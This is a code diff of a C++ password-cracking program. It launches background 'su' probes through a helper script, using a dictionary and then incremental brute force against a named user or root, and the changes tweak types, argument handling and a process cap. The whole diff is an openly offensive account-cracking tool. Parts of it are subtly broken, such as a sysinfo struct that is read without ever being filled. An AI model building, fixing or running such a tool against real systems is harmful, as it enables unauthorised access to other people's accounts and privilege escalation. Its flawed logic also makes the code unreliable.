@@ -9,6 +9,7 @@
 using namespace std;
 
 int MAX_VALID_ASCII = 126;
+int PROC_CAP = 400; //How many processes do we think it can handle at once?
 int MIN_VALID_ASCII = 33;
 int MAX_PROC = 0; //will hold the number of processes we can have at once
 string USERNAME = "Bob"; //"" for root
@@ -16,7 +17,7 @@ string USERNAME = "Bob"; //"" for root
 unordered_map <string, int> HT;
 vector <string> pwds;
 
-long string_to_int(string s){
+long long string_to_int(string s){
 	long sum = 0;
 	for(int i = 0; i <= s.length()-1; i++){
 		sum += (s[i]-MIN_VALID_ASCII)*pow(MAX_VALID_ASCII-MIN_VALID_ASCII,s.length()-i-1);
@@ -24,7 +25,7 @@ long string_to_int(string s){
 	return sum;
 } 
 
-string int_to_string(long l){
+string int_to_string(long long l){
 	string s = "";
 	for(int i = 1; (long(pow(93,i))) < l; i++){
 		s+=char(int(l%(long(pow(93,i)))+33));
@@ -55,7 +56,7 @@ int main(int argc, char **argv){
 
     //Initialize Dictionary 
     ifstream pwd_file;
-    pwd_file.open("argv[1]");
+    pwd_file.open(argv[1]);
     if(!pwd_file.is_open()){
     	cout << "Invalid file\n";
     	return(1);
@@ -103,9 +104,11 @@ int main(int argc, char **argv){
 
 
 	//PASSWORD CRACKING MODE:
+	sysinfo si;
     system("rm su.txt; install -m 666 /dev/null su.txt"); //writeable file for storing password
     for(int i = 0; i <= DICT_SIZE; i++){ //Keeps procs from trying the same words
-        const string cmd = "bash suprobe.sh " + pwds[i] +' '+ USERNAME + to_string(getpid()) + " >/dev/null 2>/dev/null &";
+    	while((int)si.procs > PROC_CAP) usleep (1); //Avoid fork bombing yourself
+        const string cmd = "bash suprobe.sh " + pwds[i] +' '+ USERNAME + ' ' + to_string(getpid()) + " >/dev/null 2>/dev/null &";
         system(cmd.c_str());
         //TODO: if(cracked) stop;
     }
@@ -114,7 +117,7 @@ int main(int argc, char **argv){
     pwd+=char(33);
     //while(!cracked){
     	//Test Password 
-    	const string cmd = "bash suprobe.sh " + pwd +' '+ USERNAME + to_string(getpid()) + ">/dev/null 2>/dev/null &";
+    	const string cmd = "bash suprobe.sh " + pwd +' '+ USERNAME + ' ' + to_string(getpid()) + ">/dev/null 2>/dev/null &";
         system(cmd.c_str());
         //Increment String
         pwd=int_to_string(string_to_int(pwd)+1);
